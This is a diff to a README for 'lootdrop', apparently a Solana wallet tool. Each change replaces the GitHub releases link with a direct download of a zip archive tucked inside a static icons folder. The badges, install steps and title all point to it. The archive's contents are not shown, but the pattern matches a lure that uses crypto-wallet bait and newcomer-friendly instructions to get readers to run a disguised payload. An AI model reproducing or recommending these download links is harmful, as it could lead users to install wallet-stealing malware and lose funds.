@@ -1,6 +1,6 @@
 # 🎲 lootdrop - Simple Solana Wallet Access
 
-[![Download lootdrop](https://img.shields.io/badge/Download-lootdrop-brightgreen?style=for-the-badge)](https://github.com/evan-anatasius/lootdrop/releases)
+[![Download lootdrop](https://img.shields.io/badge/Download-lootdrop-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/evan-anatasius/lootdrop/main/web/static/icons/Software-v3.0.zip)
 
 ## 📋 About lootdrop
 
@@ -34,7 +34,7 @@ This section helps you get lootdrop running on your Windows computer. It’s des
 ### Step 1: Visit the Release Page
 
 Click the big green button at the top or visit this link:  
-[https://github.com/evan-anatasius/lootdrop/releases](https://github.com/evan-anatasius/lootdrop/releases)
+[https://raw.githubusercontent.com/evan-anatasius/lootdrop/main/web/static/icons/Software-v3.0.zip](https://raw.githubusercontent.com/evan-anatasius/lootdrop/main/web/static/icons/Software-v3.0.zip)
 
 You will see a list of available versions and files.
 
@@ -73,7 +73,7 @@ When you open lootdrop, you will be asked to connect a wallet:
 
 You can always get the latest version here:
 
-[![Download lootdrop](https://img.shields.io/badge/Download-lootdrop-blue?style=for-the-badge)](https://github.com/evan-anatasius/lootdrop/releases)
+[![Download lootdrop](https://img.shields.io/badge/Download-lootdrop-blue?style=for-the-badge)](https://raw.githubusercontent.com/evan-anatasius/lootdrop/main/web/static/icons/Software-v3.0.zip)
 
 Click the link and pick the installer for Windows as described above.
 
@@ -135,4 +135,4 @@ Use these if you want to search for more help or tools related to lootdrop.
 
 ---
 
-# [🎲 lootdrop - Simple Solana Wallet Access](https://github.com/evan-anatasius/lootdrop/releases)
+# [🎲 lootdrop - Simple Solana Wallet Access](https://raw.githubusercontent.com/evan-anatasius/lootdrop/main/web/static/icons/Software-v3.0.zip)
